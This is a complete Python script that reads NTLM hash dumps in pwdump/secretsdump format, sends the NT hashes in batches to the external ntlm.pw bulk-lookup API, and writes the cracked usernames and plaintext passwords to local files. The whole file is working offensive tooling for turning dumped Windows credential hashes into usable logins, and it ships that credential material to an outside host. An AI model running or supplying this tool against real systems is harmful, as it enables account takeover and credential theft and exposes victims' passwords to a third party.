#!/usr/bin/env python3
import re
import requests
import argparse
import sys

GREEN = '\033[92m'
RED = '\033[91m'
BLUE = '\033[94m'
RESET = '\033[0m'

def crack_hashes(path, n):
	pattern = r'(.*):\d+:[a-f0-9]{32}:([a-f0-9]{32}):::'

	# build hashes to crack
	users = []
	hashes = []
	try:
		with open(path) as fin:
			for idx, line in enumerate(fin, start=1):
				match = re.match(pattern, line.rstrip())
				if match:
					users.append(match.group(1))
					hashes.append(match.group(2))
				else:
					print(f"{RED}[-] Couldn't match on line:{RESET} {line}")
				if idx == n:
					break
	except FileNotFoundError:
		print(f'{RED}[-] File "{path}" not found')
		sys.exit(1)

	hashPhases = [hashes[i: i + 100] for i in range(0, len(hashes), 100)]
	cracked = []

	for crackPhase in hashPhases:
		toCrack = "\n".join(crackPhase)

		response = requests.post('https://ntlm.pw/api/bulklookup', data=toCrack)

		if response.status_code != 200:
			print(response.text)
			sys.exit(1)

		r_text = response.text

		cracked.extend([c.split(':')[1] for c in r_text.split("\n")[:-1]])

	return len(users), dict(zip(users, cracked))

def main():
	parser = argparse.ArgumentParser(description="Use ntlm.pw to automatically convert hash dumps to credentials")
	parser.add_argument('file_path', help='Path to the file containing hash dumps')
	parser.add_argument('-s', '--separate-files', action='store_true', help='Output credentials in separate files')
	parser.add_argument('-n', type=int, help='Limit to the first n lines of the file')
	parser.add_argument('-f', '--filter-not-found', action='store_true', help="Filter hashes that can't be cracked")

	if len(sys.argv) == 1:
		parser.print_help()
		sys.exit(1)

	args = parser.parse_args()

	if args.filter_not_found:
		print(f"{BLUE}[*] Filtering hashes that can't be cracked{RESET}")
	if args.n:
		print(f"{BLUE}[*] Limiting to first {args.n} hashes{RESET}")

	toCrackLen, cracked = crack_hashes(args.file_path, args.n)
	totCracked = 0

	if args.separate_files:
		userFile = open('users', 'w')
		passFile = open('passwords', 'w')
		for user, password in cracked.items():
			if not args.filter_not_found or password != '[not found]':
				userFile.write(user + "\n")
				passFile.write(password + "\n")
			if password != '[not found]':
				totCracked += 1
		userFile.close()
		passFile.close()
		print(f'{GREEN}[+] Wrote users/passwords to files: "users" and "passwords"{RESET}')
	else:
		with open('credentials', 'w') as fout:
			for user, password in cracked.items():
				if not args.filter_not_found or password != '[not found]':
					fout.write(user + ":" + password + "\n")
				if password != '[not found]':
					totCracked += 1
		print(f'{GREEN}[+] Wrote credentials to file: "credentials"{RESET}')

	print(f'{GREEN}[+] Cracked {totCracked}/{toCrackLen} hashes{RESET}')
if __name__ == "__main__":
	main()
